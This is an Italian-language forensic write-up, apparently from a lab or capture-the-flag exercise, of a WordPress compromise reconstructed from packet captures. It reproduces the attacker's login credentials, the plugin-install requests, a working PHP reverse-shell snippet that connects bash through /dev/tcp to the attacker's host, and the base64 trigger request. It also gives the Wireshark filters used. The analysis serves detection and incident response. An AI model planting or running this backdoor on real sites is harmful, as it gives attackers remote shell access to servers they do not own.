
# CVE-2024-7420 (58.16.78.90 -> 192.168.100.101)

Flussi TCP confermano un’azione potenzialmente malevola da parte di un attore che dispone di privilegi admin, che ha installato un plugin ad  code-snippets. Sono state fatte ulteriori analisi per veriicahe che se questo fosse un tentativo di sfruttare  volnuberati note al plugin code-snippets.

**When**

| **Evento**                     | **Timestamp** | **TCP Stream** | **Dettagli**                                   |
|--------------------------------|---------------|----------------|-----------------------------------------------|
| Login admin riuscito           | 22:45:15.45   | 458            | POST a /wp-login.php con admin:byebye         |
| Installazione plugin           | 22:45:15.80   | 461            | Navigazione e installazione code-snippets     |
| Upload dello snippet malevolo  | 22:46:21.03   | 621            | POST con file fancy_rnd.json                  |
| Attivazione della shell remota | 22:47:09.60   | 730            | GET con rand=NTguMTYuNzguOTAvNDQz             |

**Who/Where**

| **Ruolo**         | **Indirizzo IP**       | **Porta**       |
|--------------------|------------------------|-----------------|
| Attaccante         | 58.16.78.90           | 51144, 51176, 54012, 44250 |
| Server compromesso | 192.168.100.101       | 80 (srv-www)    |
| Porta reverse shell |  58.16.78.90         | 443             |

**What**

1. l'attaccante riesci a superare il login di WordPress con privilegi admin
 utilizzando credenziali rubate dall attacco precedente

```sh
POST /wp-login.php
...
log=admin&pwd=byebye
```

2. code-snippets

- Navigazione nella sezione plugin
- Ricerca di un plugin con parametro s=code
- Installazione del plugin code-snippets 

```sh
GET /wp-admin/plugins.php
GET /wp-admin/plugin-install.php
POST /wp-admin/admin-ajax.php HTTP/1.1
slug=code-snippets&action=install-plugin&_ajax_nonce=aad5c50a4b&_fs_nonce=&username=&password=&connection_type=&public_key=&private_key=
```

3.  L’attaccante ha caricatouno snippet PHP che implementa una reverse shell su richiesta quando il sito viene visitato con richieste GET e parametro 'rand'. 

```php
add_action('init', function() {
    if ( isset($_GET['rand']) ) {
        exec('/bin/bash -c "bash -i >& /dev/tcp/' . base64_decode($_GET['rand']) . ' 0>&1"');
    }
});
```

4. Attivazione della reverse shell da parte dell'attaccante

```sh
GET /?rand=NTguMTYuNzguOTAvNDQz
```

 - echo "NTguMTYuNzguOTAvNDQz" | base64 -d 
 - 58.16.78.90/443
 - il server wordpress ha stabilito una connessione uscente verso 58.16.78.90:443, fornendo accesso completo a shell bash interattiva.


**How**
L'attaccante ha sfruttato le credenziali amminsitrative cambiate nell attacco precednere
L'attaccante ha sfruttato la vulberabilità relativa al plugin code-snippets [CVE-2024-7420](https://nvd.nist.gov/vuln/detail/CVE-2024-7420)

**Why**
Pieno controllo del server , esfiltraizone dati della compagnia.

**Filtri Wireshark utilizzati**

```sh
http.request.method == "POST" && http contains "login"
http.request.method == "POST" && http.request.uri contains "code-snippets"
http.request.uri contains "rand="
```